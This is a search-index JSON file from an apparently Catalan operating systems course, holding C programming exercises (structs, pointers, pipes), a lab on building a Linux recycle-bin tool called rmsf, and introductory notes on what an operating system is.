mallocs‚Äôhauria de comprovar que no retornen NULL per assegurar-se que la reserva de mem√≤ria ha estat exitosa. Un valor molt gran de n podria fer que malloc fall√©s.\n\n\nD‚Äôaquesta manera podem crear una llista din√†mica de pokemons i introduir les dades dels pokemons en temps d‚Äôexecuci√≥. Per exemple:\nQuants pokemons vols introduir? 3\nIntrodueix les seves dades en format: id nom altura pes\n25 Pikachu 0.4 6.0\nIntrodueix les seves dades en format: id nom altura pes\n26 Raichu 0.8 30.0\nIntrodueix les seves dades en format: id nom altura pes\n27 Sandshrew 0.6 12.0\n\n\n\n\n\n\nImportantObservaci√≥\n\n\n\nLa funci√≥ scanf(\"%s\", name) √©s insegur ja que pot causar un buffer overflow si l‚Äôusuari introdueix una cadena m√©s llarga que la mida del buffer. Per evitar aquest problema, podem utilitzar la funci√≥ fgets() en lloc de scanf(). Aquesta funci√≥ ens permet especificar la mida del buffer i evita el buffer overflow.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon¬∑"
    ]
  },
  {
    "objectID": "activities/unit00/02-ex01-c.html#proposta-dexercicis-dampliaci√≥",
    "href": "activities/unit00/02-ex01-c.html#proposta-dexercicis-dampliaci√≥",
    "title": "Exercicis amb C - Pokemon",
    "section": "Proposta d‚Äôexercicis d‚Äôampliaci√≥",
    "text": "Proposta d‚Äôexercicis d‚Äôampliaci√≥\n\nImplementa el codi aplicant totes les millores per fer-lo m√©s robust i segur, assegurant que l‚Äôentrada de dades sigui correcta, que no es produeixin fuites de mem√≤ria i que es comprovin els errors en el retorn de les crides d‚Äôassignaci√≥ de mem√≤ria.\nCrea un Makefile per compilar tot el projecte. Ha de permetre compilar els fitxers .c i generar l‚Äôexecutable amb una sola comanda, aix√≠ com netejar els fitxers objecte amb un make clean.\nImplementa una nova llibreria pokedex.h i pokedex.c que contingui les funcions per gestionar una Pokedex.\n\nCrea una estructura Pokedex que contingui un array din√†mic de punters a Pokemon, juntament amb els camps size i capacity.\nImplementa funcions per inicialitzar, afegir, treure, cercar i imprimir Pok√©mon de la Pokedex.\nQuan afegeixis un Pok√©mon, comprova que no existeixi cap Pok√©mon amb el mateix pokemon_id per evitar duplicats.\nUtilitza malloc i realloc per gestionar el creixement del array din√†mic.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C - Pokemon¬∑"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html",
    "href": "activities/unit00/01-debianbin.html",
    "title": "RMSF ¬∑ Implementant una paperera de reciclatge a Linux",
    "section": "",
    "text": "Aprendre a utilitzar crides a sistema per obtenir informaci√≥ de l‚Äôusuari, gestionar fitxers i directoris.\nPracticar la manipulaci√≥ de cadenes en C per construir rutes de fitxers.\nDesenvolupar habilitats en la creaci√≥ de programes en C que interactuen amb el sistema operatiu.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF ¬∑ Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html#objectius",
    "href": "activities/unit00/01-debianbin.html#objectius",
    "title": "RMSF ¬∑ Implementant una paperera de reciclatge a Linux",
    "section": "",
    "text": "Aprendre a utilitzar crides a sistema per obtenir informaci√≥ de l‚Äôusuari, gestionar fitxers i directoris.\nPracticar la manipulaci√≥ de cadenes en C per construir rutes de fitxers.\nDesenvolupar habilitats en la creaci√≥ de programes en C que interactuen amb el sistema operatiu.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF ¬∑ Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html#introducci√≥",
    "href": "activities/unit00/01-debianbin.html#introducci√≥",
    "title": "RMSF ¬∑ Implementant una paperera de reciclatge a Linux",
    "section": "Introducci√≥",
    "text": "Introducci√≥\nAls sistemes operatius basats en el nucli de Linux, no hi ha una paperera de reciclatge per defecte. Aquesta funcionalitat, habitual en altres sistemes, no est√† integrada nativament en l‚Äôestructura de fitxers de Linux. L‚Äôobjectiu d‚Äôaquest laboratori √©s implementar una paperera de reciclatge per a Linux i crear una eina que permeti utilitzar-la (rmsf).\nman rmsf",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF ¬∑ Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html#rmsf1---manual-de-lusuari",
    "href": "activities/unit00/01-debianbin.html#rmsf1---manual-de-lusuari",
    "title": "RMSF ¬∑ Implementant una paperera de reciclatge a Linux",
    "section": "rmsf(1) - Manual de l‚Äôusuari",
    "text": "rmsf(1) - Manual de l‚Äôusuari\n\nNOM\nrmsf - Eliminaci√≥ segura de fitxers i carpetes\n\n\nS√çNTESI\nrmsf file ‚Ä¶\n\n\nDESCRIPCI√ì\nL‚Äôeina rmsf mou els fitxers i carpetes especificats a la l√≠nia de comandes al directori .trash/, situat al directori personal de l‚Äôusuari. Aquest proc√©s no suposa l‚Äôeliminaci√≥ definitiva dels fitxers. El programa crea el directori .trash si no existeix. Si els fitxers no tenen permisos d‚Äôescriptura i el dispositiu d‚Äôentrada est√†ndard √©s un terminal, l‚Äôusuari rebr√† una sol¬∑licitud de confirmaci√≥ (mostrada a la sortida d‚Äôerror est√†ndard).\n\n\nESTAT DE SORTIDA\nrmsf retorna un codi d‚Äô√®xit 0 en cas d‚Äô√®xit i &gt;0 si es produeix algun error.\n\n\nEXEMPLES\nEls seg√ºents exemples mostren l‚Äô√∫s com√∫:\n\nrmsf file1\nrmsf file1 dir\nrmsf file1 dir/file2 b\nrmsf file1 dir/subdir/file2",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF ¬∑ Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "activities/unit00/01-debianbin.html#tasques",
    "href": "activities/unit00/01-debianbin.html#tasques",
    "title": "RMSF ¬∑ Implementant una paperera de reciclatge a Linux",
    "section": "Tasques",
    "text": "Tasques\n\nObtenint informaci√≥ de l‚Äôusuari\nEl primer pas per implementar rmsf √©s obtenir informaci√≥ sobre l‚Äôusuari que executa el programa. En particular, necessitem saber quin √©s el seu directori home per poder crear la paperera all√†. Necessitem consultar dues crides a sistema per aconseguir-ho: getuid() i getpwuid().\n\n\n\n\n\n\nConsell\n\n\n\nAquestes crides a sistema es defineixen als fitxers d‚Äôencap√ßalament &lt;unistd.h&gt; i &lt;pwd.h&gt;, respectivament i es poden consultar a la p√†gina del manual: man 2 getuid i man 3 getpwuid.\n\n\nConstrueix el programa whoami.c que imprimeix el nom de l‚Äôusuari actual.\n\n\nComprovant si un directori existeix\nAbans de moure res, hem de saber si la paperera ($HOME/.trash) existeix. Per aix√≤, utilitzarem la crida a sistema stat(), que ens permet obtenir informaci√≥ sobre un fitxer o directori. Per veure com funciona, consulta la p√†gina del manual: man 2 stat.\nConstrueix el programa mystat.c que comprova si un directori existeix amb stat().\nConstrueix tamb√© una versi√≥ alternativa mystat2.c que utilitzi opendir() per comprovar l‚Äôexist√®ncia del directori. Consulta la p√†gina del manual: man 3 opendir.\n\n\n\n\n\n\nConsellSeccions del manual\n\n\n\nLa diferencia entre la secci√≥ 2 i la 3 del manual √©s que la primera fa refer√®ncia a crides a sistema (sistema operatiu) i la segona a funcions de la biblioteca est√†ndard de C.\n\n\n\n\nConcatenant rutes\nPer construir la ruta completa de la paperera ($HOME/.trash), necessitem concatenar cadenes. Una cadena fixa (‚Äú.trash‚Äù) amb la cadena que representa el directori home de l‚Äôusuari. La biblioteca est√†ndard de C proporciona diverses funcions per treballar amb cadenes, com strcat(), strcpy(), i sprintf().\nCrear un petit programa que concateni el home de l‚Äôusuari amb la cadena ‚Äú.trash‚Äù. Peer fer-ho, utilitzarem mem√≤ria din√†mica amb malloc() per reservar l‚Äôespai necessari per a la cadena resultant i free() per alliberar-la despr√©s d‚Äôusar-la.\n\n\nCreant directoris\nPer poder veure la informaci√≥ de la crida a sistema mkdir() fem man 2 mkdir.\nImplementa el programa mkd.c que donat un directori comprovi si existeix i si no el crei amb tots els permisos per l‚Äôusuari i sense permisos pel grup i altres.\n\n\nMovent fitxers i directoris\nPer moure fitxers, utilitzarem la crida a sistema rename(), que permet canviar el nom o la ubicaci√≥ d‚Äôun fitxer o directori. Consulta la p√†gina del manual: man 2 rename.\nImplementa el programa mymv.c que mogui un fitxer a la paperera. Pode assumir que la paperera ja existeix.\n\n\nImplementant rmsf\nAmb totes les peces anteriors, ja podem muntar rmsf. Implementa el programa rmsf.c.\n\n\nExercicis Opcionals\n\nPuja el codi rmsf.c al repositori.\nImplementa un Makefile per compilar i executar el programa.\nActualitzeu el programa utilitzant la llibreria getopt per poder passar opcions com:\n\n-h per mostrar l‚Äôajuda.\n-v per mostrar la versi√≥.\n-d per enviar a la paperera de reciclatge fitxers i directoris.\n-r per recuperar fitxers i directoris de la paperera de reciclatge a la seva ubicaci√≥ original.\n-t per mostrar la ubicaci√≥ de la paperera de reciclatge.\n\nAfegiu una opci√≥ per preguntar a l‚Äôusuari si vol enviar a la paperera cada fitxer o directori. I en cas afirmatiu, enviar-lo. En cas negatiu, no fer res. Aquesta opci√≥ pot estar activada per defecte i es pot desactivar amb l‚Äôopci√≥ -y.\nInvestiga com crear una realsease a GitHub i crea una release amb el teu codi anomenada v1.0.",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "RMSF ¬∑ Implementant una paperera de reciclatge a Linux"
    ]
  },
  {
    "objectID": "activities/unit00/03-ex02-c.html",
    "href": "activities/unit00/03-ex02-c.html",
    "title": "Exercicis amb C - Apuntadors i structs",
    "section": "",
    "text": "Quin ser√† el resultat d‚Äôaquesta execuci√≥?\n#include&lt;stdio.h&gt;\nint main(){\n\n    int x = 5;\n    int *p;\n    p=&x;\n    x++;\n    printf(\"%d\\n\", *p);\n}\nCompleta el codi seg√ºent:\n#include &lt;stdio.h&gt;\nint main(){\n    const char *s = \"\";\n    char str[] = \"Hola\";\n    s = str;\n    while(*s)\n        printf(\"%c\", ???);\n    return 0;\n}\nAnalitzeu el seg√ºent codi i mostreu el contingut de la mem√≤ria durant l‚Äôexecuci√≥ del programa.\nint main(){\n\n    struct pokemon {\n        int id;\n        char* name;\n    };\n\n    struct pokemon p1 = {1, \"Bulbasaur\"};\n\n    printf(\"Id: %d\\n\", p1.id);\n    printf(\"Name: %s\\n\", p1.name);\n\n}\nAnalitza el codi seg√ºent i digues quin √©s el resultat de la seva execuci√≥.\nint main(){\n    char * s = \"Hola\";\n    char * t = \"Ad√©u\";\n    char * u;\n\n    s = t;\n    u = strdup(s);\n\n    // Nota: strdup retorna un punter a una nova cadena de car√†cters que √©s una c√≤pia exacta de la cadena de car√†cters passada com a argument.\n\n    printf(\"s: %s\\n\", s);\n    printf(\"t: %s\\n\", t);\n    printf(\"u: %s\\n\", u);\n}\nAnalitza el codi seg√ºent i digues quin √©s el resultat de la seva execuci√≥.\nint main(){\n\n    int n = 3;\n    char* noms[n];\n    char* nom = (char*)malloc(20*sizeof(char));\n\n    for(int i = 0; i &lt; n; i++){\n        printf(\"Introdueix el teu nom: \");\n        scanf(\"%s\", nom);\n        noms[i] = nom;\n    }\n\n    printf(\"Noms introdu√Øts:\\n\");\n    for(int i = 0; i &lt; n; i++){\n        printf(\"%s\\n\", noms[i]);\n    }\n\n    return 0;\n}\nAnalitza el codi seg√ºent i digues quin √©s el resultat de la seva execuci√≥.\n#include &lt;stdio.h&gt;\nint main()\n{\n    int k = 5;\n    int *p = &k;  \n    int **m = &p;\n    **m = 6;  \n    printf(\"%d\\n\", k);\n}\nCompleta el codi seg√ºent:\n#include &lt;stdio.h&gt;\nint main() {\n    int arr[4] = {1, 2, 3, 4};  \n\n    // ????\n\n    printf(\"Elements of the array using the pointer:\\n\");\n    for (int i = 0; i &lt; 4; i++) {\n        printf(\"ptr[%d] = %d\\n\", i, (*ptr)[i]);\n    }\n\n    return 0;\n}\nQuin ser√† el resultat d‚Äôaquesta execuci√≥?\n#include &lt;stdio.h&gt;\nint main()\n{\n\n    int a[5] = {5,1,15,20,25};\n    int i,j,m;\n    i = ++a[1];\n    j = a[1]++;\n    m = a[i++];\n\n    printf(\"%d, %d, %d\", i, j,m);\n    return 0;\n}\nQuin ser√† el resultat?\n#include &lt;stdio.h&gt;\n\nvoid foo(int *p)\n{\n    int j = 22;\n    p = &j;\n    printf(\"%d \", *p);\n}\n\nint main()\n{\n    int i = 17, *p = &i;\n    foo(&i);\n    printf(\"%d \", *p);\n}\nQuina ser√† la sortida?\n#include &lt;stdio.h&gt;\nstruct p\n{\n    int x;\n    int y;\n};\n\n// sizeof(int) == 2 bytes? \n// sizeof(int) == 4 bytes? \n\nint main()\n{\n    struct p p1[] = {\n        {1, 92}, \n        {3, 94}, \n        {5, 96}\n    };\n\n    int x = (sizeof(p1) / 3);\n\n    printf(\"%ld\\n\",sizeof(int));\n\n    if (x == 8)\n        printf(\"true\\n\");\n    else\n        printf(\"false\\n\");\n}\nCompleta el codi seg√ºent:\nint main(){\nint (*ptr)();\nreturn 0;\n}",
    "crumbs": [
      "Activitats",
      "Unitat 01",
      "Exercicis amb C"
    ]
  },
  {
    "objectID": "activities/unit02/02-pipes.html",
    "href": "activities/unit02/02-pipes.html",
    "title": "Exercicis de Pipes en C",
    "section": "",
    "text": "Volem implementar un programa en C que permeti generar bitllets de loteria de forma concurrent de la mateixa manera que als apunts generador_loteria, per√≤ aquesta vegada els processos fills han de comunicar els n√∫meros generats al proc√©s pare mitjan√ßant una pipe en lloc de retornar-los com a codi de sortida.\nAnalitza el programa seg√ºent i indica la evoluci√≥ de la taula de descriptors oberts de cada fitxer. Explica qu√® fa el programa.\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;fcntl.h&gt;\n\nint main(){\n    int fd;\n    int pipefd[2];\n    char msg[200];\n    char buffer[200];\n\n    fd = open(\"fitxer.txt\", O_RDONLY);\n    pipe(pipefd);\n\n    if(fork() == 0){\n        close(1);\n        close(pipefd[0]);\n        write(4, \"Hola\", 4);\n        while(1);\n        exit(0);\n    }\n\n    else{\n        close(pipefd[1]);\n        read(pipefd[0], buffer, 4);\n        sprintf(msg, \"PARE -&gt; %s\\n\", buffer);\n        write(1, msg, strlen(msg));\n        wait(NULL);\n        exit(0);\n    }\n}\nImplementa amb C la comanda seg√ºent: cat &lt; /etc/passwd | grep root utilitzant 2 fills i un pare. Per recobrir heu de fer servir obligat√≤riament les crides:\n\nexeclp(\"grep\", \"grep\", \"root\", NULL)\nexeclp(\"cat\", \"cat\", NULL)\n\nEn el programa anterior el filtre √©s est√†tic root, com podriam modificar el codi anterior per tenir un filtre din√†mic passat com a argument a l‚Äôexecuci√≥ del programa? Per exemple: ./prog root.\nImplementa amb C el seg√ºent programa: head -10 &lt; infile | sort -n | tail -3 &gt; outfile.\nImplementa la multiplicaci√≥ de matrius utilitzant processos i pipes. El proc√©s pare ha de llegir dues matrius quadrades d‚Äôun fitxer d‚Äôentrada i crear un proc√©s fill per a cada fila de la matriu resultat. Cada proc√©s fill ha de calcular la fila corresponent de la matriu resultat i enviar-la al proc√©s pare mitjan√ßant una pipe. El proc√©s pare ha de recollir totes les files i escriure la matriu resultat en un fitxer de sortida.\nModifica l‚Äôexercici anterior per utilitzar pipes an√≤nimes i nominals. Compara els dos m√®todes en termes de complexitat i efici√®ncia."
  },
  {
    "objectID": "notes/01-introduction.html",
    "href": "notes/01-introduction.html",
    "title": "Introducci√≥",
    "section": "",
    "text": "Un sistema inform√†tic √©s la interconnexi√≥ d‚Äôelements de hardware, software i usuaris que treballen conjuntament per aconseguir un objectiu com√∫.\n\nEls components hardware s√≥n els dispositius f√≠sics del sistema, com el processador, la mem√≤ria, el disc dur, el teclat, el ratol√≠, la impressora, etc.\nEls components software s√≥n els programes que s‚Äôexecuten en el sistema, com el sistema operatiu, els programes d‚Äôaplicaci√≥, els controladors de dispositius, etc.\n\nA continuaci√≥ es mostra un esquema simplificat d‚Äôun sistema inform√†tic.\n\n\n\nSistema Inform√†tic (Hardware)\n\n\nEn la figura, es representen els components hardware d‚Äôun sistema inform√†tic, com la CPU, la mem√≤ria, el disc dur, el teclat, el ratol√≠ o la xarxa. Aquests components interactuen amb el programari, com el sistema operatiu, les aplicacions o els controladors de dispositius, per proporcionar funcionalitats als usuaris. La CPU, per exemple, processa les instruccions, mentre que la mem√≤ria guarda la informaci√≥ temporalment, i els dispositius d‚Äôentrada/sortida (com el teclat o el ratol√≠) permeten la interacci√≥ amb els usuaris.\n\n\nEl sistema operatiu actua com a mediador entre el hardware i el software, gestionant els recursos i proporcionant una interf√≠cie perqu√® les aplicacions puguin comunicar-se amb els components f√≠sics. Aix√≤ permet que els usuaris i els desenvolupadors no hagin de preocupar-se per les particularitats del hardware, ja que el sistema operatiu s‚Äôencarrega d‚Äôabstreure‚Äôn la complexitat.\n\n\n\nSistema Operatiu (Software)\n\n\nEn la figura, es mostra com el sistema operatiu actua com a intermediari entre els components hardware i software d‚Äôun sistema inform√†tic.\n\n\n\nEl m√≥n es comporta com un gran sistema paral¬∑lel, on molts processos i activitats es duen a terme simult√†niament. Per tant, els nostres sistemes inform√†tics tamb√© han de poder actuar en paral¬∑lel per ser eficients i competents. No ens serveix un sistema que nom√©s pugui fer una cosa alhora.\nEn inform√†tica, aquest comportament s‚Äôaconsegueix gr√†cies a la multitasca, que permet que un sistema inform√†tic executi m√∫ltiples processos alhora, optimitzant els recursos disponibles. Aix√≤ √©s especialment important en entorns moderns, on un √∫nic ordinador pot executar diverses aplicacions i serveis al mateix temps.\n\n\n\nEls sistemes inform√†tics moderns s√≥n heterogenis i es componen d‚Äôuna √†mplia gamma de components de hardware i software, cada un amb les seves pr√≤pies caracter√≠stiques. Per exemple:\n\nArquitectures de CPU: Inclouen processadors de fabricants com Intel, AMD i ARM, amb difer√®ncies significatives en els conjunts d‚Äôinstruccions, mecanismes de seguretat i vulnerabilitats espec√≠fiques. Tamb√© s‚Äôhan de considerar arquitectures especialitzades com RISC-V i altres dissenys emergents.\nMem√≤ria: Com RAM (mem√≤ria d‚Äôacc√©s aleatori) de diferents tipus DDR (DDR3, DDR4, DDR5), ROM (mem√≤ria nom√©s de lectura), mem√≤ria cache (L1, L2, L3) i mem√≤ries persistents com la mem√≤ria flash. Cada tipus de mem√≤ria presenta diferents velocitats, capacitat i lat√®ncia, i s‚Äôha de gestionar de manera eficient per optimitzar el rendiment del sistema.\nDiscs durs: Inclouen HDD (discos durs tradicionals), SSD (unitats d‚Äôestat s√≤lid), NVMe (Non-Volatile Memory Express) i dispositius de mem√≤ria externa com USB i targetes de mem√≤ria. En un sistema es podem trobar diferents tipus de discos durs, cadascun amb caracter√≠stiques espec√≠fiques en termes de velocitat, capacitat i durabilitat. A m√©s, si un disc falla, s‚Äôha de poder migrar les dades a un altre disc sense perdre la informaci√≥.\nDispositius d‚Äôentrada/sortida: Com teclats, ratolins, pantalles, impressores, esc√†ners, c√†meres, micr√≤fons, altaveus, etc. Cada dispositiu d‚Äôentrada/sortida t√© les seves pr√≤pies interf√≠cies i controladors, i s‚Äôha de poder gestionar de manera eficient per garantir una interacci√≥ fluida amb l‚Äôusuari.\nXarxes: Inclouen adaptadors Ethernet, targetes Wi-Fi, routers, commutadors, servidors, dispositius IoT (Internet of Things) i altres components de xarxa.\nSensors i dispositius integrats: Com sensors de temperatura, humitat, acceler√≤metres, giroscopis, GPS, etc. Aquests dispositius poden ser utilitzats per recopilar dades ambientals, geolocalitzaci√≥, moviment i altres dades que poden ser cr√≠tiques per a la seguretat i el funcionament del sistema.\nFirmware: Com BIOS/UEFI, microcontroladors i altres sistemes de baix nivell. El firmware √©s el software integrat en components de hardware que controla les funcions m√©s b√†siques del sistema, com l‚Äôarrencada, la configuraci√≥ i la gesti√≥ de dispositius. Les vulnerabilitats en el firmware poden ser cr√≠tiques, ja que poden permetre als atacants accedir a les funcions m√©s profundes del sistema.\n\n\n\n\nImagineu que un programador hagu√©s de con√®ixer en detall el funcionament de tots aquests components hardware per escriure un programa.\n\nSeria pr√†cticament impossible escriure programes eficients sense l‚Äôajuda d‚Äôuna capa que abstrau la complexitat del maquinari, com fa el sistema operatiu.\n\nImagineu que un programador hagu√©s de desenvolupar un programa diferent per a cada combinaci√≥ de components hardware.\n\nAbans dels sistemes operatius moderns, aix√≤ era una realitat. Ara, gr√†cies a l‚Äôabstracci√≥ que proporciona el sistema operatiu, els desenvolupadors poden escriure programes que funcionen en m√∫ltiples dispositius sense haver de preocupar-se per les difer√®ncies del hardware.\n\n\nPer tant, un sistema inform√†tic √©s un sistema complex format per components heterogenis i interconnectats, que funcionen en paral¬∑lel i de forma coordinada. On el sistema operatiu actua com a cervell i permet als usuaris i desenvolupadors interactuar amb el sistema de manera eficient i intu√Øtiva.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ¬∑Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#introducci√≥-als-sistemes-inform√†tics",
    "href": "notes/01-introduction.html#introducci√≥-als-sistemes-inform√†tics",
    "title": "Introducci√≥",
    "section": "",
    "text": "Un sistema inform√†tic √©s la interconnexi√≥ d‚Äôelements de hardware, software i usuaris que treballen conjuntament per aconseguir un objectiu com√∫.\n\nEls components hardware s√≥n els dispositius f√≠sics del sistema, com el processador, la mem√≤ria, el disc dur, el teclat, el ratol√≠, la impressora, etc.\nEls components software s√≥n els programes que s‚Äôexecuten en el sistema, com el sistema operatiu, els programes d‚Äôaplicaci√≥, els controladors de dispositius, etc.\n\nA continuaci√≥ es mostra un esquema simplificat d‚Äôun sistema inform√†tic.\n\n\n\nSistema Inform√†tic (Hardware)\n\n\nEn la figura, es representen els components hardware d‚Äôun sistema inform√†tic, com la CPU, la mem√≤ria, el disc dur, el teclat, el ratol√≠ o la xarxa. Aquests components interactuen amb el programari, com el sistema operatiu, les aplicacions o els controladors de dispositius, per proporcionar funcionalitats als usuaris. La CPU, per exemple, processa les instruccions, mentre que la mem√≤ria guarda la informaci√≥ temporalment, i els dispositius d‚Äôentrada/sortida (com el teclat o el ratol√≠) permeten la interacci√≥ amb els usuaris.\n\n\nEl sistema operatiu actua com a mediador entre el hardware i el software, gestionant els recursos i proporcionant una interf√≠cie perqu√® les aplicacions puguin comunicar-se amb els components f√≠sics. Aix√≤ permet que els usuaris i els desenvolupadors no hagin de preocupar-se per les particularitats del hardware, ja que el sistema operatiu s‚Äôencarrega d‚Äôabstreure‚Äôn la complexitat.\n\n\n\nSistema Operatiu (Software)\n\n\nEn la figura, es mostra com el sistema operatiu actua com a intermediari entre els components hardware i software d‚Äôun sistema inform√†tic.\n\n\n\nEl m√≥n es comporta com un gran sistema paral¬∑lel, on molts processos i activitats es duen a terme simult√†niament. Per tant, els nostres sistemes inform√†tics tamb√© han de poder actuar en paral¬∑lel per ser eficients i competents. No ens serveix un sistema que nom√©s pugui fer una cosa alhora.\nEn inform√†tica, aquest comportament s‚Äôaconsegueix gr√†cies a la multitasca, que permet que un sistema inform√†tic executi m√∫ltiples processos alhora, optimitzant els recursos disponibles. Aix√≤ √©s especialment important en entorns moderns, on un √∫nic ordinador pot executar diverses aplicacions i serveis al mateix temps.\n\n\n\nEls sistemes inform√†tics moderns s√≥n heterogenis i es componen d‚Äôuna √†mplia gamma de components de hardware i software, cada un amb les seves pr√≤pies caracter√≠stiques. Per exemple:\n\nArquitectures de CPU: Inclouen processadors de fabricants com Intel, AMD i ARM, amb difer√®ncies significatives en els conjunts d‚Äôinstruccions, mecanismes de seguretat i vulnerabilitats espec√≠fiques. Tamb√© s‚Äôhan de considerar arquitectures especialitzades com RISC-V i altres dissenys emergents.\nMem√≤ria: Com RAM (mem√≤ria d‚Äôacc√©s aleatori) de diferents tipus DDR (DDR3, DDR4, DDR5), ROM (mem√≤ria nom√©s de lectura), mem√≤ria cache (L1, L2, L3) i mem√≤ries persistents com la mem√≤ria flash. Cada tipus de mem√≤ria presenta diferents velocitats, capacitat i lat√®ncia, i s‚Äôha de gestionar de manera eficient per optimitzar el rendiment del sistema.\nDiscs durs: Inclouen HDD (discos durs tradicionals), SSD (unitats d‚Äôestat s√≤lid), NVMe (Non-Volatile Memory Express) i dispositius de mem√≤ria externa com USB i targetes de mem√≤ria. En un sistema es podem trobar diferents tipus de discos durs, cadascun amb caracter√≠stiques espec√≠fiques en termes de velocitat, capacitat i durabilitat. A m√©s, si un disc falla, s‚Äôha de poder migrar les dades a un altre disc sense perdre la informaci√≥.\nDispositius d‚Äôentrada/sortida: Com teclats, ratolins, pantalles, impressores, esc√†ners, c√†meres, micr√≤fons, altaveus, etc. Cada dispositiu d‚Äôentrada/sortida t√© les seves pr√≤pies interf√≠cies i controladors, i s‚Äôha de poder gestionar de manera eficient per garantir una interacci√≥ fluida amb l‚Äôusuari.\nXarxes: Inclouen adaptadors Ethernet, targetes Wi-Fi, routers, commutadors, servidors, dispositius IoT (Internet of Things) i altres components de xarxa.\nSensors i dispositius integrats: Com sensors de temperatura, humitat, acceler√≤metres, giroscopis, GPS, etc. Aquests dispositius poden ser utilitzats per recopilar dades ambientals, geolocalitzaci√≥, moviment i altres dades que poden ser cr√≠tiques per a la seguretat i el funcionament del sistema.\nFirmware: Com BIOS/UEFI, microcontroladors i altres sistemes de baix nivell. El firmware √©s el software integrat en components de hardware que controla les funcions m√©s b√†siques del sistema, com l‚Äôarrencada, la configuraci√≥ i la gesti√≥ de dispositius. Les vulnerabilitats en el firmware poden ser cr√≠tiques, ja que poden permetre als atacants accedir a les funcions m√©s profundes del sistema.\n\n\n\n\nImagineu que un programador hagu√©s de con√®ixer en detall el funcionament de tots aquests components hardware per escriure un programa.\n\nSeria pr√†cticament impossible escriure programes eficients sense l‚Äôajuda d‚Äôuna capa que abstrau la complexitat del maquinari, com fa el sistema operatiu.\n\nImagineu que un programador hagu√©s de desenvolupar un programa diferent per a cada combinaci√≥ de components hardware.\n\nAbans dels sistemes operatius moderns, aix√≤ era una realitat. Ara, gr√†cies a l‚Äôabstracci√≥ que proporciona el sistema operatiu, els desenvolupadors poden escriure programes que funcionen en m√∫ltiples dispositius sense haver de preocupar-se per les difer√®ncies del hardware.\n\n\nPer tant, un sistema inform√†tic √©s un sistema complex format per components heterogenis i interconnectats, que funcionen en paral¬∑lel i de forma coordinada. On el sistema operatiu actua com a cervell i permet als usuaris i desenvolupadors interactuar amb el sistema de manera eficient i intu√Øtiva.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ¬∑Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#sistema-operatiu-conceptes-b√†sics",
    "href": "notes/01-introduction.html#sistema-operatiu-conceptes-b√†sics",
    "title": "Introducci√≥",
    "section": "Sistema Operatiu: Conceptes b√†sics",
    "text": "Sistema Operatiu: Conceptes b√†sics\nUn sistema operatiu √©s un programa que actua com a intermediari entre l‚Äôusuari i el sistema inform√†tic. El seu objectiu principal √©s proporcionar als usuaris una interf√≠cie simple, neta i coherent del sistema, i gestionar tots els recursos del mateix.\nGr√†cies al sistema operatiu, els programadors poden escriure programes que s‚Äôexecutin en qualsevol sistema inform√†tic, independentment dels seus components hardware, i sense necessitat de con√®ixer-ne els detalls t√®cnics.\n\nDefinici√≥ formal d‚Äôun sistema operatiu\n\nUn programa encarregat de l‚Äôassignaci√≥ dels recursos d‚Äôun sistema inform√†tic, aix√≠ com del control i supervisi√≥ de l‚Äôexecuci√≥ correcta de les diferents aplicacions i programes.\nUn programa que controla tots els recursos del sistema, proporcionant la base sobre la qual es poden escriure i executar altres programes.\n\n\n\nFuncions d‚Äôun sistema operatiu\nEl sistema operatiu compleix quatre funcions essencials que podem destacar:\n\nProporcionar una interf√≠cie d‚Äôusuari: El sistema operatiu ofereix una interf√≠cie que permet als usuaris interactuar amb el sistema inform√†tic de manera intu√Øtiva i eficient. Aquesta interf√≠cie pot ser gr√†fica (GUI) o de l√≠nia de comandes (CLI).\nProporcionar una plataforma d‚Äôexecuci√≥: El sistema operatiu actua com a plataforma per a l‚Äôexecuci√≥ de programes i aplicacions. Proporciona un entorn d‚Äôexecuci√≥ segur i a√Øllat per a les aplicacions.\nGestionar els recursos del sistema: El sistema operatiu gestiona els recursos del sistema, com la mem√≤ria, la CPU, el disc dur, la xarxa, etc. Aix√≤ inclou la planificaci√≥ de processos, la gesti√≥ de la mem√≤ria, la gesti√≥ de l‚Äôemmagatzematge i la gesti√≥ de la xarxa.\nProporcionar portabilitat: El sistema operatiu permet que els programes s‚Äôexecutin en diferents sistemes inform√†tics sense necessitat de modificacions. Aix√≤ permet als programadors escriure programes una sola vegada i executar-los en m√∫ltiples plataformes.\n\n\n\nTipus de sistemes operatius\n\nPr√≤posit general: Windows, Linux, MacOS.\n\nMultitasca, multiusuari, multiprocessador.\nExemples: Windows 11, Ubuntu, MacOS Catalina.\n\nServidors: Unix, Linux.\n\nOptimitzats per a Alt Rendiment: Dissenyats per gestionar grans volums de dades i usuaris simultanis.\nDedicats a tasques espec√≠fiques com ara servidors web, servidors de correu, servidors de bases de dades, etc.\nExemples: Debian, AlmaLinux, FreeBSD.\n\nDispositius m√≤bils: iOS, Android.\n\nOptimitzats per a Dispositius T√°ctils: Interf√≠cies i funcionalitats adaptades per a l‚Äô√∫s m√≤bil.\n\nSistemes encastats: RTOS (Real-Time Operating System).\n\nOptimitzats per a sistemes encastats i temps real.\nExemples: FreeRTOS, VxWorks, QNX.\n\nSistemes Especifics: Sistemes operatius optimitzats per a tasques espec√≠fiques, com ara sistemes de control de tr√†nsit, sistemes de navegaci√≥, sistemes de televisi√≥ digital, etc.\nUnikernels: Sistemes operatius 